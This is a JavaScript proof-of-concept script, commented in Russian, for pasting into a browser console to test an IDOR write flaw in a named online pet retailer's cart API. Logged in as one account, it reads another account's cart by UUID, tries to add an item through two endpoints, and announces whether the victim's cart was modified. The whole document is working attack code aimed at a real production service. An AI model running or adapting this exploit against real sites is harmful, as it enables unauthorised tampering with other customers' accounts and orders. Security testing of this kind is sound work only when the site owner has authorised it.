// Скопируйте и выполните этот код в консоли браузера (F12 → Console)
// Убедитесь что залогинены под Account B (suobup@dunkos.xyz)

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 2966095;

console.log("[*] Testing cart write IDOR...");
console.log("[*] Target cart UUID:", CART_UUID);

// Шаг 1: Получить текущее состояние корзины Account A
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  const beforeCount = cart.articles.length;
  const beforeTotal = cart.summary.grandTotal;
  console.log(`[+] Cart before: ${beforeCount} items, ${beforeTotal} EUR`);
  window.beforeCount = beforeCount;
  window.beforeTotal = beforeTotal;
  
  // Шаг 2: Попробовать добавить товар
  console.log("[*] Attempting to add article...");
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "x-requested-with": "XMLHttpRequest"
    },
    body: JSON.stringify({
      "offerId": OFFER_ID
    })
  });
})
.then(r => {
  console.log(`[+] POST /articles response: HTTP ${r.status}`);
  return r.text().then(text => {
    console.log(`[+] Response: ${text.substring(0, 500)}`);
    if (r.status === 200 || r.status === 201) {
      console.log("[!!!] SUCCESS! Article added!");
    }
    return r.status;
  });
})
.then(status => {
  // Шаг 3: Проверить корзину после модификации
  if (status === 200 || status === 201) {
    console.log("[*] Verifying cart modification...");
    return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
      credentials: 'include'
    });
  } else {
    console.log("[!] Add failed, trying /add endpoint...");
    return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/add`, {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `offerId=${OFFER_ID}&quantity=1`
    })
    .then(r => {
      console.log(`[+] POST /add response: HTTP ${r.status}`);
      return r.text().then(text => {
        console.log(`[+] Response: ${text.substring(0, 500)}`);
        if (r.status === 200 || r.status === 201) {
          console.log("[!!!] SUCCESS via /add!");
        }
        return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
          credentials: 'include'
        });
      });
    });
  }
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("");
    console.log("[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
  } else {
    console.log("[!] Cart unchanged - write operations may be protected");
  }
})
.catch(e => {
  console.error("[!] Error:", e);
});

